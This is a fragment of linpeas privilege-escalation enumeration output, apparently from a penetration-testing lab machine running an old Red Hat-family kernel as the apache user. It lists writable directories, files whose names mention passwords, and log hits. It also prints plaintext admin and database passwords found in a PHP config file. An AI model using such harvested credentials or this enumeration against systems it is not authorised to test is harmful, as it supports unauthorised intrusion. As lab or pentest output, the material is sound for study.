-rw-r--r--  1 root root 1385 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/.conmakehash.cmd
-rw-r--r--  1 root root 1579 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/genksyms/.genksyms.o.cmd
-rw-r--r--  1 root root 1919 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/genksyms/.lex.o.cmd
-rw-r--r--  1 root root 145 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/genksyms/.genksyms.cmd
-rw-r--r--  1 root root 1024 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/genksyms/.parse.o.cmd
-rw-r--r--  1 root root 51676 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/.config
-rw-r--r--  1 root root 0 Sep  1  2022 /.autofsck

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxr-xr-x  1 apache apache 828087 Jan 31 00:15 /tmp/linpeas.sh

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/shm
/tmp
/tmp/linpeas.sh
/var/cache/mod_proxy
/var/cache/mod_ssl
/var/lib/dav
/var/spool/samba
/var/spool/vbox
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group apache:
/var/lib/php/session

╔══════════╣ Searching passwords in config PHP files
  $ACS_CONFIG["admin_password"] = "admin";
  $ACS_CONFIG["db_password"] = "aCs2009offsec";

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/httpd/conf/ssl.key
/etc/pam.d/system-config-rootpassword
/etc/security/console.apps/system-config-rootpassword
/usr/bin/system-config-rootpassword
/usr/lib/pppd/2.4.2/passwordfd.so
/usr/share/applications/system-config-rootpassword.desktop
/usr/share/doc/krb5-devel-1.3.4/kadmin/draft-ietf-cat-kerb-chg-password-02.txt
/usr/share/firstboot/modules/rootpassword.py
/usr/share/icons/hicolor/48x48/apps/system-config-rootpassword.png
/usr/share/locale/ar/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/bg/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/bn/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/ca/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/cs/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/cy/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/da/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/de/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/el/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/es/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/et/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/fa/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/fi/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/fr/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/gu/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/he/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/hi/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/hr/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/hu/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/id/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/is/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/it/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/ja/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/ka/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/ko/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/ku/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/lt/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/mk/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/mn/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/mr/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/ms/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/nb/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/nl/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/no/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/pa/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/pl/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/pt/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/pt_BR/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/ru/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/si/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/sk/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/sl/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/sv/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/ta/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/tr/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/uk/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/ur/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/vi/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/zh_CN/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/zh_TW/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/locale/zu/LC_MESSAGES/system-config-rootpassword.mo
/usr/share/man/man3/des_read_2passwords.3ssl.gz
/usr/share/man/man3/des_read_password.3ssl.gz
/usr/share/pixmaps/password.png
/usr/share/system-config-rootpassword
/usr/share/system-config-rootpassword/passwordDialog.py
/usr/share/system-config-rootpassword/pixmaps/system-config-rootpassword.png
/usr/share/system-config-rootpassword/system-config-rootpassword
/usr/share/system-config-rootpassword/system-config-rootpassword.py

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
/usr/sbin/prelink: Could not prelink /usr/bin/userpasswd because its dependency /lib/libattr.so.1 could not be prelinked
pam_passwdqc-0.7.5-2.i386.rpm
passwd-0.68-10.1.i386.rpm
system-config-rootpassword-1.1.6-1.noarch.rpm



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r' 